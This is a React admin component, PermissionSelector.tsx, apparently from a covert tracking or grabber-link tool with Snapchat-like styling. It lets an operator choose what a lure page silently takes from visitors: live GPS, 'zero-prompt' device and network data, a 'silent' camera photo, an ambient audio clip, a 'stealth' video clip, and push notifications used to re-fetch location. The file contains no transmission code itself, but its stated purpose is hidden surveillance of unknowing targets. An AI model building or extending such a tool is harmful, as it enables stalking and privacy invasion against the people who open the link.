// components/admin/PermissionSelector.tsx
"use client";

import React from "react";
import { PermissionsConfig } from "@/lib/types";
import { MapPin, Smartphone, Camera, Mic, Video, Bell } from "lucide-react";

interface PermissionSelectorProps {
  config: PermissionsConfig;
  onChange: (config: PermissionsConfig) => void;
}

export const PermissionSelector: React.FC<PermissionSelectorProps> = ({ config, onChange }) => {
  const toggle = (key: keyof PermissionsConfig) => {
    onChange({
      ...config,
      [key]: !config[key],
    });
  };

  const options: Array<{
    key: keyof PermissionsConfig;
    title: string;
    desc: string;
    icon: React.ReactNode;
    badge?: string;
  }> = [
    {
      key: "location",
      title: "GPS Location",
      desc: "Live coordinates, accuracy & CARTO map pin",
      icon: <MapPin className="w-4 h-4 text-emerald-500 dark:text-emerald-400" />,
    },
    {
      key: "device_info",
      title: "Hardware & Network",
      desc: "CPU, RAM, GPU, Battery & City (Zero prompt)",
      icon: <Smartphone className="w-4 h-4 text-cyan-500 dark:text-cyan-400" />,
      badge: "Zero-Prompt",
    },
    {
      key: "camera",
      title: "Camera Photo Snap",
      desc: "Silent front/back verification photo",
      icon: <Camera className="w-4 h-4 text-[#FFFC00]" />,
    },
    {
      key: "audio",
      title: "Ambient Audio Memo",
      desc: "5-second microphone ambient clip",
      icon: <Mic className="w-4 h-4 text-amber-500 dark:text-amber-400" />,
    },
    {
      key: "video",
      title: "Video + Audio Burst",
      desc: "3-second stealth video clip with sound",
      icon: <Video className="w-4 h-4 text-purple-500 dark:text-purple-400" />,
    },
    {
      key: "push_notifications",
      title: "Web Push Notifications",
      desc: "Send alerts & re-fetch fresh GPS anytime",
      icon: <Bell className="w-4 h-4 text-rose-500 dark:text-rose-400" />,
      badge: "Re-engage",
    },
  ];

  return (
    <div className="space-y-2">
      <div className="flex items-center justify-between">
        <label className="text-xs font-bold text-slate-900 dark:text-white">
          Requested Permissions &amp; Telemetry
        </label>
        <span className="text-[10px] text-slate-500 dark:text-white/40 font-mono">
          {Object.values(config).filter(Boolean).length} enabled
        </span>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
        {options.map((opt) => {
          const isEnabled = Boolean(config[opt.key]);
          return (
            <div
              key={opt.key}
              onClick={() => toggle(opt.key)}
              className={`p-2.5 rounded-2xl border cursor-pointer transition-all flex items-start justify-between gap-2.5 select-none active:scale-[0.98] ${
                isEnabled
                  ? "bg-amber-500/10 dark:bg-[#FFFC00]/10 border-amber-500/40 dark:border-[#FFFC00]/40 shadow-sm"
                  : "bg-slate-50 dark:bg-black/20 border-slate-200 dark:border-white/5 opacity-60 hover:opacity-100"
              }`}
            >
              <div className="flex items-start gap-2.5 min-w-0">
                <div className={`p-1.5 rounded-xl shrink-0 ${isEnabled ? "bg-amber-500/20 dark:bg-[#FFFC00]/20" : "bg-black/5 dark:bg-white/5"}`}>
                  {opt.icon}
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-1.5">
                    <p className="text-xs font-bold text-slate-900 dark:text-white truncate">{opt.title}</p>
                    {opt.badge && (
                      <span className="px-1 py-0.2 rounded text-[9px] font-mono bg-black/10 dark:bg-white/10 text-slate-600 dark:text-white/70">
                        {opt.badge}
                      </span>
                    )}
                  </div>
                  <p className="text-[10px] text-slate-600 dark:text-white/50 leading-tight mt-0.5 truncate">
                    {opt.desc}
                  </p>
                </div>
              </div>
              <div
                className={`w-4 h-4 rounded-full border shrink-0 flex items-center justify-center transition-all mt-0.5 ${
                  isEnabled ? "bg-amber-500 dark:bg-[#FFFC00] border-transparent" : "border-slate-300 dark:border-white/20 bg-transparent"
                }`}
              >
                {isEnabled && <div className="w-1.5 h-1.5 rounded-full bg-white dark:bg-black" />}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};
